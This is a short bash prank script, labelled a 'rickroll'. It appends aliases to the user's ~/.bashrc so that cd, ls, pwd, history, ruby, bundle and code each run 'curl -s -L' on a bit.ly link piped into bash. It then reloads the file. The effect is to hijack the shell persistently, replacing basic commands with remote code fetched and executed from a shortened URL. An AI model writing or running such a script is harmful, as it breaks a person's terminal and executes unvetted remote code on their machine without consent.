#!/usr/bin/env bash

# Commands to alias
cmdNames=("cd" "ls" "bundle" "ruby" "code" "history" "pwd")

# Alias commands to rickroll
for i in "${cmdNames[@]}"; do
    echo "alias $i='(curl -s -L http://bit.ly/10hA8iC | bash) && echo $1 > /dev/null'" >> ~/.bashrc
done

# Reload bashrc
. ~/.bashrc
